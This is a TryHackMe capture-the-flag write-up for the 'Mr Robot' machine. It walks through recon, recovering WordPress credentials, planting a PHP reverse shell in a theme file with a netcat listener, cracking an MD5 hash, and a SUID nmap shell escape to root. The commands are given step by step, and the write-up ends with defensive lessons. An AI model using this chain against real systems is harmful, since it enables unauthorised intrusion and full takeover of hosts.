---
title = "Mr Robot - THM"
date = 2026-03-08
description = "Exploiting a WordPress installation to root via SUID nmap"
tags = ["ctf", "tryhackme", "wordpress", "privilege-escalation", "suid", "nmap", "reverse-shell"]
---

|           |                                        |
|-----------|----------------------------------------|
| **Difficulty** | Medium                            |
| **OS**         | Linux                             |
| **Tools Used** | nmap, gobuster, curl, netcat, john |
| **Platform**   | TryHackMe                         |

## Recon

Starting with a full port scan:

```bash
nmap -sV -p- 10.82.169.159
```

```bash
PORT    STATE  SERVICE VERSION
22/tcp  closed ssh
80/tcp  open   http
443/tcp open   https
```

The ports initially showed as closed because the machine was still booting. Worth remembering if results look wrong early on: just wait and re-scan.

With HTTP and HTTPS open, the next step is web enumeration.

## Web Enumeration

I started with dirbuster but it was painfully slow with a large wordlist. Switched to gobuster:

```bash
gobuster dir -u http://10.82.169.159 -w /usr/share/dirb/wordlists/common.txt
```

Key findings:

- `/robots.txt`
- `/wp-login.php`
- `/license`
- `/readme`

WordPress installation confirmed.

## Robots.txt and Key 1

```bash
curl http://10.82.169.159/robots.txt
```

```bash
User-agent: *
fsocity.dic
key-1-of-3.txt
```

First flag retrieved directly:

```bash
curl http://10.82.169.159/key-1-of-3.txt
```

The `fsocity.dic` file is a wordlist. Downloaded it and checked:

```bash
wc -l fsocity.dic          # 858,160 lines
sort -u fsocity.dic | wc -l # 11,451 unique lines
sort -u fsocity.dic > fsocity_unique.dic
```

98% duplicates. Always deduplicate wordlists before brute-forcing.

## Finding Credentials

Checked the other paths gobuster found:

```bash
curl http://10.82.169.159/readme
```

This returned a base64-encoded string:

```bash
ZWxsaW90OkVSMjgtMDY1Mgo=
```

```bash
echo "ZWxsaW90OkVSMjgtMDY1Mgo=" | base64 -d
elliot:ER28-0652
```

WordPress credentials. The `=` padding at the end is a reliable indicator of base64 encoding.

## Reverse Shell via WordPress

Logged in at `/wp-login.php` with `elliot:ER28-0652`.

WordPress's theme editor allows direct modification of PHP files, which means arbitrary code execution if you have admin access. I replaced the contents of `404.php` in the Twenty Fifteen theme with a PHP reverse shell (from `/usr/share/webshells/php/php-reverse-shell.php`), modified with my tun0 IP and a chosen port.

Set up a listener:

```bash
nc -lvnp 1234
```

Triggered the shell:

```bash
curl http://10.82.169.159/wp-content/themes/twentyfifteen/404.php
```

Shell received as `daemon`. Stabilised it:

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
```

## Lateral Movement: daemon to robot

Checked `/home/robot/`:

```bash
ls -la /home/robot/
```

Two files: `key-2-of-3.txt` (only readable by `robot`) and `password.raw-md5` (world-readable).

```bash
cat /home/robot/password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```

An MD5 hash stored in a world-readable file. Saved it and ran John:

```bash
john --format=raw-md5 --wordlist=fsocity.dic hash.txt
```

This didn't crack it. The issue was case sensitivity: the wordlist contained `ABCDEFGHIJKLMNOPQRSTUVWXYZ` but the hash corresponded to the lowercase alphabet. The hash `c3fcd3d76192e4007dfb496cca67e13b` resolves to `abcdefghijklmnopqrstuvwxyz`.

MD5 is case-sensitive. `hash("ABC")` and `hash("abc")` produce entirely different outputs.

```bash
su robot
# Password: abcdefghijklmnopqrstuvwxyz
```

Second flag retrieved from `/home/robot/key-2-of-3.txt`.

## Privilege Escalation: robot to root

Standard SUID enumeration:

```bash
find / -perm -4000 -type f 2>/dev/null
```

`nmap` appeared in the results, owned by root with the SUID bit set. SUID means the binary executes with the permissions of its owner rather than the user running it. A root-owned SUID nmap is a well-known privesc vector.

Older versions of nmap (pre-5.21) had an `--interactive` mode that allowed arbitrary shell command execution. Since the spawned shell inherits nmap's effective UID (root, via SUID), you get a root shell:

```bash
nmap --interactive
nmap> !sh
```

```bash
whoami
root
```

The privilege chain: `robot` executes nmap (SUID root), nmap spawns a shell, the shell runs as root.

Third flag retrieved from `/root/key-3-of-3.txt`.

## Summary

| Step             | Vector                                              |
|------------------|-----------------------------------------------------|
| Key 1            | Information disclosure via `robots.txt`              |
| Initial access   | WordPress admin login with base64-encoded credentials |
| Foothold         | PHP reverse shell via theme editor                   |
| Key 2            | MD5 hash cracked from world-readable file            |
| Privesc          | SUID nmap interactive mode shell escape              |
| Key 3            | Root flag                                            |

This box chains together several individually low-complexity vulnerabilities: information disclosure in `robots.txt`, credentials left in a publicly accessible file, a WordPress theme editor that allows arbitrary PHP execution, a password hash stored with no access controls, and an SUID binary with a known shell escape. None of these are sophisticated on their own, but together they give you a clean path from anonymous visitor to root. The defensive takeaways are straightforward: don't use `robots.txt` as a security mechanism, disable the WordPress theme editor, restrict file permissions on sensitive data, replace MD5 with a proper hashing algorithm, and audit SUID binaries regularly.
